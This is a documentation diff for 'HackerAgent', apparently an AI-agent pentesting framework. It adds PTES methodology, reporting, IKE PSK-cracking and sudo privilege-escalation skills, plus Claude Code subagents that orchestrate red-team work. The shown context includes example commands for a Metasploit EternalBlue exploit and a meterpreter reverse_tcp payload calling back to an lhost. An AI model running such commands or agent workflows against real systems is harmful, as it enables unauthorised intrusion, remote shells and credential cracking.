@@ -56,6 +56,12 @@ HackerAgent/
 │       ├── wayback_osint.py        # Wayback Machine CDX API: URLs históricas, secretos JS, robots.txt diff
 │       ├── recon_ng_osint.py       # Recon-ng automatizado + fallback (WHOIS, DNS brute, HackerTarget, GitHub)
 │       └── social_osint.py         # Social OSINT: Reddit API, Twitter/X, LinkedIn, GitHub secretos, Pastebin
+│   └── redteam_skills/             # Integración metodología RedTeam Barranquilla (redteambq.co)
+│       ├── ptes_methodology.py     # Plan PTES 7-fases mapeado a skills (discover, don't assume)
+│       ├── report_pro.py           # Reporte Ejecutivo + Técnico (PTES/OWASP) desde project_state.json
+│       ├── ike_enum.py             # IKE/IPSec Aggressive Mode: ike-scan + psk-crack (crackeo PSK)
+│       └── sudo_privesc.py         # Escalada por sudo: matcher de CVEs (Baron Samedit, chwoot, runas -1…)
+├── .claude/agents/                 # Subagentes Claude Code: redteam-agent.md, report-agent.md
 ├── out/                            # out/<nombre_proyecto>/  (creado por picker)
 │   └── <proyecto>/
 │       └── credentials/            # whiteintel_num guarda aquí JSONs + creds.txt
@@ -121,6 +127,7 @@ CATEGORY_LABELS = {
     "ataque":       "💥 ATAQUE / EXPLOTACIÓN",             # metasploit, cred_stuff
     "movil":        "📱 PENTESTING MÓVIL / APK",            # apk_analyze, apk_dynamic
     "desarrollo":   "🛠  DESARROLLO DE CÓDIGO / MALWARE",  # model_advisor, code_dev, tech_detect, evasion_dev, ducky_dev
+    "metodologia":  "🧭 METODOLOGÍA PTES / REPORTING",      # ptes_methodology, report_pro
     "otros":        "⚙  OTROS",
 }
 ```
@@ -223,7 +230,28 @@ SKILL:social_osint username=johndoe keyword="security"
 SKILL:metasploit mode=exploit target=10.10.11.1 module=exploit/windows/smb/ms17_010_eternalblue lhost=10.10.14.1
 SKILL:metasploit mode=scan target=192.168.1.0/24
 SKILL:metasploit mode=payload lhost=10.10.14.1 payload=windows/x64/meterpreter/reverse_tcp output=/tmp/shell.exe
+SKILL:ptes_methodology target=example.com
+SKILL:ptes_methodology target=10.10.11.87 phase=exploitation
+SKILL:report_pro project=mi_proyecto target=example.com
+SKILL:ike_enum target=10.10.11.87 wordlist=/usr/share/wordlists/rockyou.txt
+SKILL:sudo_privesc version=1.9.15
+SKILL:sudo_privesc          # sin versión → comandos de enumeración
 ```
+
+### Integración RedTeam Barranquilla (`skills/redteam_skills/`)
+
+Metodología y técnicas adaptadas de la comunidad [RedTeam Barranquilla](https://redteambq.co/)
+(PTES, enfoque *discover-don't-assume*). Añade la categoría `metodologia`:
+
+| Skill | Categoría | Qué hace | Severidades |
+|-------|-----------|----------|-------------|
+| `ptes_methodology` | metodologia | Plan PTES 7-fases mapeado a skills de HackerAgent | info / low |
+| `report_pro` | metodologia | Reporte Ejecutivo + Técnico desde `project_state.json` | info (report_generated) |
+| `ike_enum` | recon_activo | IKE/IPSec Aggressive Mode (ike-scan + psk-crack) | psk_cracked (critical) · ike_aggressive_mode/psk_hash (high) · ike_identity (medium) |
+| `sudo_privesc` | ataque | Matcher de CVEs de sudo + enumeración | sudo_cve (critical/high/medium) · info |
+
+Además, los subagentes de Claude Code en `.claude/agents/` (`redteam-agent`, `report-agent`)
+orquestan el flujo PTES y la redacción de reportes apoyándose en estos skills.
 
 ### Estructura de cada skill
 
